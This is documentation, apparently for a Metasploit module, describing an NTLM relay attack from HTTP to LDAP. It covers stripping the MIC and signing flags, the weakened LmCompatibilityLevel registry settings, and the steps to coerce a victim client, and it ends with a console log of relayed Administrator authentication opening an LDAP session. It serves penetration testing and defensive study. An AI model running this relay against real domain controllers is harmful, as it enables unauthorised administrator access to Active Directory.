## Vulnerable Application

### Description

This module sets up an HTTP server that attempts to execute an NTLM relay attack against an LDAP server on the
configured `RHOSTS`. The relay attack targets NTLMv1 authentication, as NTLMv2 cannot be relayed to LDAP due to the
Message Integrity Check (MIC). The module automatically removes the relevant flags to bypass signing.

This module supports relaying one HTTP authentication attempt to multiple LDAP servers. After attempting to relay to
one target, the relay server sends a 307 to the client and if the client is configured to respond to redirects, the
client resends the NTLMSSP_NEGOTIATE request to the relay server. Multi relay will not work if the client does not
respond to redirects.

The module supports relaying NTLM authentication which has been wrapped in GSS-SPNEGO. HTTP authentication info is sent
in the WWW-Authenticate header. In the auth header base64 encoded NTLM messages are denoted with the NTLM prefix, while
GSS wrapped NTLM messages are denoted with the Negotiate prefix. Note that in some cases non-GSS wrapped NTLM auth can
be prefixed with Negotiate.

If the relay attack is successful, an LDAP session is created on the target. This session can be used by other modules
that support LDAP sessions, such as:

- `admin/ldap/rbcd`
- `auxiliary/gather/ldap_query`

The module also supports capturing NTLMv1 and NTLMv2 hashes.

### Setup

For this relay attack to be successful, it is important to understand the difference between the Target Server (the
Domain Controller receiving the relayed authentication) and the Victim Client (the machine sending the initial HTTP
request) and how their respective configurations can impact the success of the attack.

The Domain Controller must be configured to accept LM or NTLM authentication. This means the `LmCompatibilityLevel`
registry key on the DC must be set to 4 or lower. If it is set to `5` ("Send NTLMv2 response only. Refuse
LM and NTLM"), the DC will reject the relayed authentication and the module will fail.

You can verify or modify the Domain Controller's level using the following commands:
```cmd
# To check the current level:
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa -v LmCompatibilityLevel

# To set the level to 4 (or lower):
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa -v LmCompatibilityLevel /t REG_DWORD /d 0x4 /f
```

The client being coerced must be willing to send the vulnerable NTLM responses.
- Non-Windows Clients: Custom tools or Linux-based HTTP clients are unaffected by Windows registry keys and can easily
be relayed to a vulnerable DC.
- Windows Clients: If you are coercing a native Windows HTTP client (like `Invoke-WebRequest` or a browser), the victim
machine's `LmCompatibilityLevel` dictates what it is allowed to send. To successfully relay a Windows client, its local
registry key typically needs to be set to `2` or lower. If the Windows client is operating at level `3` or higher, it
restricts itself to sending only NTLMv2 responses, which will cause the relay to fail even if the target DC is vulnerable.

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/server/relay/http_to_ldap`  
3. Set the `RHOSTS` options
4. Run the module
5. Send an authentication attempt to the relay server
   6. `Invoke-WebRequest -Uri http://192.0.2.1/test -UseDefaultCredentials`
7. Check the output for successful relays and captured hashes

## Scenarios
### Relaying to multiple targets
```
msf auxiliary(server/relay/http_to_ldap) > set rhosts 172.16.199.200 172.16.199.201
rhosts => 172.16.199.200 172.16.199.201
msf auxiliary(server/relay/http_to_ldap) > run
[*] Auxiliary module running as background job 2.

[*] Relay Server started on 0.0.0.0:80
[*] Server started.
msf auxiliary(server/relay/http_to_ldap) > [*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
[*] Processing request in state unauthenticated from 172.16.199.130
[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
[*] Processing request in state unauthenticated from 172.16.199.130
[*] Received Type 1 message from 172.16.199.130, attempting to relay...
[*] Attempting to relay to ldap://172.16.199.201:389
[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
[*] Received type2 from target ldap://172.16.199.201:389, attempting to relay back to client
[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
[*] Processing request in state awaiting_type3 from 172.16.199.130
[*] Received Type 3 message from 172.16.199.130, attempting to relay...
[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
[+] Identity: KERBEROS\Administrator - Successfully relayed NTLM authentication to LDAP!
[+] Relay succeeded
[*] Moving to next target (172.16.199.200). Issuing 307 Redirect to /ZdF7Ufkm0I
[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
[*] Processing request in state unauthenticated from 172.16.199.130
[*] Received Type 1 message from 172.16.199.130, attempting to relay...
[*] Attempting to relay to ldap://172.16.199.200:389
[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
[*] Received type2 from target ldap://172.16.199.200:389, attempting to relay back to client
[*] Received GET request from 172.16.199.130, setting client_id to 172.16.199.130
[*] Processing request in state awaiting_type3 from 172.16.199.130
[*] Received Type 3 message from 172.16.199.130, attempting to relay...
[*] Dropping MIC and removing flags: `Always Sign`, `Sign` and `Key Exchange`
[+] Identity: KERBEROS\Administrator - Successfully relayed NTLM authentication to LDAP!
[+] Relay succeeded
[*] Target list exhausted for 172.16.199.130. Closing connection.
msf auxiliary(server/relay/http_to_ldap) > sessions -i -1
[*] Starting interaction with 5...

LDAP (172.16.199.200) > getuid
[*] Server username: KERBEROS\Administrator
LDAP (172.16.199.200) >
```